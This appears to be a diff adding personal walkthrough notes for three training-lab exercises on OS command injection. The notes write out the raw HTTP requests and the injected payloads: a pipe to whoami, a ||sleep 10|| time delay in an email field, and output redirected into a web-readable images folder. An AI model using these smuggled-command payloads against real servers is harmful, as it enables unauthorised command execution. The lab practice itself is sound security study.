@@ -1,0 +1,77 @@
+Task 1:
+///Lab: OS command injection, simple case///
+
+This lab is an shell command ijection vulnerability, which means we can give direct shell orders to the server. But how?
+In URL:
+     ;               separating the commands
+     & or &&         run in the background or run after or  xy AND yz
+     | or ||         xy OR yz or giving data like with grep
+Orders we can use: 
+whoami
+ls -la or dir depends on os
+ifconfig 
+ip a
+cat
+get
+
+In our case we will write this in the url like we search parameters like productId=1 or storeId=xy.
+If we check our site and click one of the products in the url there is our first parameter: /product?productId=1, but this is not vulnerable to command injection.
+Ask down one products stock numbers, and check the request:
+POST /product/stock HTTP/1.1
+Host: 0a23006603804a7f80245dac003400ce.web-security-academy.net
+Cookie: session=HYU4NNUZhtkhzgtJNl1TfzVp2vmjd3VD
+Content-Length: 21
+---
+Connection: keep-alive
+
+productId=1&storeId=1
+
+Send the request to the repeater, and change it to:
+productId=1&storeId=1|whoami
+And we got: 
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 13
+
+peter-GQBzFz
+
+Task 2:
+///Lab: Blind OS command injection with time delays///
+
+Time delays command is: sleep X (where x is a number like sleep 5, the response will sleep for 5 secs)
+So there is a submit feedback part of the site, do a submit and in http history check the request:
+POST /feedback/submit HTTP/2
+Host: 0a9000350324721281b41b0800230061.web-security-academy.net
+---
+Priority: u=1, i
+
+csrf=DEZSKA6E6IXIaGMHYqjNeiLVtKWD2Dvp&name=oinm&email=asnd%40sinda.hu&subject=kalsdn&message=aimdms
+Now all we have to do is insert the sleep 10 somewhere between the parameters.
+with ||sleep+10|| we can do this (the email parameter will be the vulnerable):
+csrf=DEZSKA6E6IXIaGMHYqjNeiLVtKWD2Dvp&name=oinm&email=asnd%40sinda.hu||sleep+10||&subject=kalsdn&message=aimdms
+
+Task 3:
+///Lab: Blind OS command injection with output redirection///
+
+Open the site in burp, and send a feedback, send the request to the repeater:
+POST /feedback/submit HTTP/2
+Host: 0a3300930436734c8299b20b00a300bd.web-security-academy.net
+Cookie: session=xWR9NZQgQzAdLQoEVFpvvfH2SvdTAxdX
+----
+Priority: u=1, i
+
+csrf=vEtLGPaoHg8TEF7QfGVTdZvUno68fQw9&name=asd&email=asdv%40asd.hu&subject=asdas&message=asdas
+
+I guess the email parameter will be the vulnerable so check it with ||sleep+10||...and if its sleeping for 10 secs, its vulnerable. And as we can see, it is.
+Lets check it with ||whoami|| amybe we will get a response, but we dont. 
+From the lab description we know that there is a writable folder: /var/www/images/ (which means we can write to a txt file into it with our results) so if we modify our payload to ||whoami+>+/var/www/images/results.txt||
+It will create a txt file on the server with our result. But how we can check our file? Is it even exists?
+So if you check the main site's source code, you will see that the site load a lot of pictures from this directory (this is the default directory to the images) like this:
+                       <div>
+                            <img src="/image?filename=18.jpg">
+                            <h3>
+
+all we have to do is copy this into the url, change the filename to results.txt, and there is our whoami...:
+https://0a3300930436734c8299b20b00a300bd.web-security-academy.net//image?filename=results.txt
+
